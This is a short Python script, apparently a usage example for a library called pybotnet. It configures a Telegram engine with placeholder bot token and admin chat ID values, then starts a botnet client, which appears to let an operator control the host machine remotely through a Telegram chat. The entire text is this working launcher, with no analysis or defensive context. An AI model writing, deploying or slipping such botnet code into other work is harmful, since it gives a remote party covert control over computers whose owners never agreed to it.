from pybotnet import BotNet, TelegramEngine


telegram_engine = TelegramEngine(token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID) #

botnet = BotNet(telegram_engine) # 
botnet.run()
